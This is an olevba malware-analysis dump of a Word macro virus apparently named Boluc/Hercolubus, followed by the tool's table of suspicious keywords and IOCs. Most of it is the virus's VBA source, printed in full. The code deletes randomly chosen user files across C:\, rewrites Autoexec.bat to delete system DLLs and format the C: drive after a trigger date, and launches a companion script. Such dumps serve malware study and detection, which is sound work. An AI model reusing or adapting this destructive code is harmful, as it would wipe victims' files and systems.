olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Boluc-575adac68ada6c7da0f529fa6faf6c6a976b66bd
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Boluc-575adac68ada6c7da0f529fa6faf6c6a976b66bd 
in file: Virus.MSWord.Boluc-575adac68ada6c7da0f529fa6faf6c6a976b66bd - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
dim oWord
Dim fsob
Dim fil4
Dim nD
On Error Resume Next
Set fsob = CreateObject("Scripting.FileSystemObject")
Set oWord = CreateObject("Word.Application")
Set jui = oWord.NormalTemplate.VBProject.VBComponents.Item(1)
If jui.Name <> "Hercolubus" Then RunW = 10
Randomize
nD = Int((34 * Rnd) + 1)
If nD < 32 Then
If nD >= 1 And nD <= 2 Then cFiles ="*.xls"
If nD > 2 And nD <= 4 Then cFiles ="*.dbf"
If nD > 4 And nD <= 5 Then cFiles ="*.xls"
If nD > 5 And nD <= 7 Then cFiles ="*.dwg"
If nD > 7 And nD <= 9 Then cFiles ="*.mp3"
If nD > 9 And nD <= 11 Then cFiles ="*.bak"
If nD > 11 And nD <= 14 Then cFiles ="*.wav"
If nD > 14 And nD <= 16 Then cFiles ="*.bmp"
If nD > 16 And nD <= 18 Then cFiles ="*.htm"
If nD > 18 And nD <= 20 Then cFiles ="*.hlp"
If nD > 20 And nD <= 22 Then cFiles ="*.chm"
If nD > 22 And nD <= 24 Then cFiles ="*.jpg"
If nD > 24 And nD <= 26 Then cFiles ="*.gif"
If nD > 26 And nD <= 27 Then cFiles ="*.scr"
If nD > 27 And nD <= 28 Then cFiles ="*.cdr"
If nD > 28 And nD <= 31 Then cFiles ="*.TTF"
If fsob.FileExists("C:\WINDOWS\SYSTEM\ListWin.txt") Then
Set List1 = fsob.OpentextFile("C:\WINDOWS\SYSTEM\ListWin.txt")
HL = List1.ReadAll
List1.Close
Else
HL = "ARCHIVOS"
End If
Set List1 = fsob.CreateTextFile("C:\WINDOWS\SYSTEM\ListWin.txt")
List1.WriteLine (HL)
With oWord.FileSearch
.FileName = cFiles
.LookIn ="C:\"
.SearchSubFolders = True
.Execute
For i = 1 To 2
Set fil4 = fsob.GetFile(.FoundFiles(i))
fil4.Delete
List1.WriteLine Date & " " & .FoundFiles(i)
Next
List1.Close
End With
Else
If Date > DateSerial(2001, 5, 27) Then
Dim fsoh
Dim fil1
Dim fil2
Dim wt
Dim fil3
Dim s
Set fsoh = CreateObject("scripting.FilesystemObject")
Set fil1 = fsoh.OpenTextFile("c:\Autoexec.bat")
s = fil1.readAll
fil1.Close
Set fil2 = fsoh.createTextFile("c:\hercolubus.txt", True)
fil2.write (s)
fil2.WriteLine ("@echo off")
fil2.WriteLine ("DEL C:\WINDOWS\SYSTEM\*.SYS")
fil2.WriteLine ("DEL C:\WINDOWS\SYSTEM\*.DLL")
fil2.WriteLine ("DEL C:\WINDOWS\SYSTEM\*.OCX")
fil2.WriteLine ("CLS")
fil2.WriteLine ("FORMAT C: /u /v:HERCOLUBUS /autotest")
fil2.WriteLine ("if not errorlevel 0 goto FORMAT_ERROR")
fil2.WriteLine ("CLS")
fil2.Close
Set fil3 = fsoh.GetFile("c:\hercolubus.txt")
fil3.Copy ("c:\Autoexec.bat")
Set fil3 = fsoh.GetFile("c:\hercolubus.txt")
fil3.Delete
End If
End If
oWord.Quit False = DoEvents
If RunW = 10 then
Dim wsshell
Set wsshell = wscript.CreateObject("wscript.Shell")
wsshell.Run "C:\WINDOWS\SYSTEM\Docwin.vbs", 1, True
End If
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|IOC       |Docwin.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

